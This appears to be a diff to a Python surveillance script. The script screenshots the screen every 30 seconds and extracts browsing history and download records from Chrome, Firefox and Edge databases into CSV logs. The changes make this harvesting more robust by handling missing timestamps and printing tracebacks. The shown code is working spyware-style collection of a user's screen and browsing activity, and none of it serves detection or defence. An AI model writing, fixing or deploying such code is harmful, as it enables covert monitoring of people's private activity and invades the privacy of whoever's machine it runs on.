@@ -111,7 +111,9 @@ def capture_screenshot():
                 filename = os.path.join(SCREENSHOT_DIR, f"screenshot_{timestamp}.png")
                 sct.shot(output=filename)
         except Exception as e:
+            import traceback
             print(f"[!] Error capturing screenshot: {e}")
+            traceback.print_exc()
         
         time.sleep(30) # Capture every 30 seconds
 
@@ -131,10 +133,22 @@ def log_browser_history():
                             cursor = conn.cursor()
                             cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")
                             for row in cursor.fetchall():
-                                writer.writerow([datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Chrome History", row[1], row[0], row[2], datetime.fromtimestamp(row[3] / 1000000 - 11644473600)])
+                                last_visit_time = ""
+                                if row[3] is not None:
+                                    try:
+                                        last_visit_time = datetime.fromtimestamp(row[3] / 1000000 - 11644473600)
+                                    except (TypeError, ValueError):
+                                        pass
+                                writer.writerow([datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Chrome History", row[1], row[0], row[2], last_visit_time])
                             cursor.execute("SELECT tab_url, target_path, total_bytes, start_time FROM downloads")
                             for row in cursor.fetchall():
-                                writer.writerow([datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Chrome Download", os.path.basename(row[1]), row[0], f"{row[2]} bytes", datetime.fromtimestamp(row[3] / 1000000 - 11644473600)])
+                                start_time = ""
+                                if row[3] is not None:
+                                    try:
+                                        start_time = datetime.fromtimestamp(row[3] / 1000000 - 11644473600)
+                                    except (TypeError, ValueError):
+                                        pass
+                                writer.writerow([datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Chrome Download", os.path.basename(row[1]), row[0], f"{row[2]} bytes", start_time])
                     except Exception as e:
                         print(f"[!] Error reading Chrome history: {e}")
                     finally:
@@ -157,7 +171,13 @@ def log_browser_history():
                                         cursor = conn.cursor()
                                         cursor.execute("SELECT url, title, visit_count, last_visit_date FROM moz_places")
                                         for row in cursor.fetchall():
-                                            writer.writerow([datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Firefox History", row[1], row[0], row[2], datetime.fromtimestamp(row[3] / 1000000)])
+                                            last_visit_date = ""
+                                            if row[3] is not None:
+                                                try:
+                                                    last_visit_date = datetime.fromtimestamp(row[3] / 1000000)
+                                                except (TypeError, ValueError):
+                                                    pass
+                                            writer.writerow([datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Firefox History", row[1], row[0], row[2], last_visit_date])
                                 except Exception as e:
                                     print(f"[!] Error reading Firefox history: {e}")
                                 finally:
@@ -172,7 +192,13 @@ def log_browser_history():
                                         cursor = conn.cursor()
                                         cursor.execute("SELECT content.url, content.suggestedFileName, content.totalBytes, content.startTime FROM moz_downloads AS content")
                                         for row in cursor.fetchall():
-                                            writer.writerow([datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Firefox Download", row[1], row[0], f"{row[2]} bytes", datetime.fromtimestamp(row[3] / 1000000)])
+                                            start_time = ""
+                                            if row[3] is not None:
+                                                try:
+                                                    start_time = datetime.fromtimestamp(row[3] / 1000000)
+                                                except (TypeError, ValueError):
+                                                    pass
+                                            writer.writerow([datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Firefox Download", row[1], row[0], f"{row[2]} bytes", start_time])
                                 except Exception as e:
                                     print(f"[!] Error reading Firefox downloads: {e}")
                                 finally:
@@ -189,10 +215,22 @@ def log_browser_history():
                             cursor = conn.cursor()
                             cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")
                             for row in cursor.fetchall():
-                                writer.writerow([datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Edge History", row[1], row[0], row[2], datetime.fromtimestamp(row[3] / 1000000 - 11644473600)])
+                                last_visit_time = ""
+                                if row[3] is not None:
+                                    try:
+                                        last_visit_time = datetime.fromtimestamp(row[3] / 1000000 - 11644473600)
+                                    except (TypeError, ValueError):
+                                        pass
+                                writer.writerow([datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Edge History", row[1], row[0], row[2], last_visit_time])
                             cursor.execute("SELECT tab_url, target_path, total_bytes, start_time FROM downloads")
                             for row in cursor.fetchall():
-                                writer.writerow([datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Edge Download", os.path.basename(row[1]), row[0], f"{row[2]} bytes", datetime.fromtimestamp(row[3] / 1000000 - 11644473600)])
+                                start_time = ""
+                                if row[3] is not None:
+                                    try:
+                                        start_time = datetime.fromtimestamp(row[3] / 1000000 - 11644473600)
+                                    except (TypeError, ValueError):
+                                        pass
+                                writer.writerow([datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Edge Download", os.path.basename(row[1]), row[0], f"{row[2]} bytes", start_time])
                     except Exception as e:
                         print(f"[!] Error reading Edge history: {e}")
                     finally:
